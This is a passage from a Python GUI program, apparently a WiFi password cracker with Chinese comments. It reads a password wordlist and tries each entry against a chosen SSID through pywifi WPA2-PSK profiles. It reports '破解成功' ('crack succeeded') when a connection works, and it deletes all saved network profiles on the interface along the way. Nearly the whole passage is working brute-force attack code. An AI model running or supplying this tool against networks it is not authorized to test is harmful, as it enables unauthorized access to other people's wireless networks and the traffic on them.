        self.get_wifi_value.set(self.wifi_tree.item(self.sels, "values")[1])

    # print("you clicked on",self.wifi_tree.item(self.sels,"values")[1])

    # 读取密码字典，进行匹配
    def readPassWord(self):
        self.getFilePath = self.get_value.get()
        # print("文件路径：%s\n" %(self.getFilePath))
        self.get_wifissid = self.get_wifi_value.get()
        # print("ssid：%s\n" %(self.get_wifissid))
        self.pwdfilehander = open(self.getFilePath, "r", errors="ignore")
        while True:
            try:
                self.pwdStr = self.pwdfilehander.readline()
                # print("密码: %s " %(self.pwdStr))
                if not self.pwdStr:
                    break
                # self.get_wifissid = 'HIWIFI'
                self.bool1 = self.connect(self.pwdStr.strip(), self.get_wifissid)
                # print("返回值：%s\n" %(self.bool1) )
                if self.bool1:
                    # print("密码正确："+pwdStr
                    # res = "密码:%s 正确 \n"%self.pwdStr;
                    self.res = "===正确===  wifi名:%s  匹配密码：%s " % (self.get_wifissid, self.pwdStr)
                    self.get_wifimm_value.set(self.pwdStr)
                    tkinter.messagebox.showinfo('提示', '破解成功！！！')
                    print(self.res)
                    break
                else:
                    # print("密码:"+self.pwdStr+"错误")
                    self.res = "---错误--- wifi名:%s匹配密码：%s" % (self.get_wifissid, self.pwdStr)
                    print(self.res)
                # time.sleep(3)
            except:
                continue

    # 对wifi和密码进行匹配
    def connect(self, pwd_Str, wifi_ssid):
        # 创建wifi链接文件
        self.profile = pywifi.Profile()
        self.profile.ssid = wifi_ssid  # wifi名称
        self.profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        self.profile.key = pwd_Str  # 密码
        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件
        self.tmp_profile = self.iface.add_network_profile(self.profile)  # 设定新的链接文件
        self.iface.connect(self.tmp_profile)  # 链接
        time.sleep(con_time_out)
        # print(self.iface.status())
        if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上
            isOK = True
        else:
            isOK = False
        self.iface.disconnect()  # 断开
        time.sleep(1)
        # 检查断开状态
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK


def gui_start():
    init_window = Tk()
    tmp = open("tmp.ico", "wb+")
    tmp.write(b64decode(img))
    tmp.close()
    init_window.iconbitmap("tmp.ico")
    from os import remove
    remove("tmp.ico")

    ui = MY_GUI(init_window)
    print(ui)
    ui.set_init_window()
    # ui.scans_wifi_list()

    init_window.mainloop()


if __name__ == '__main__':
    gui_start()
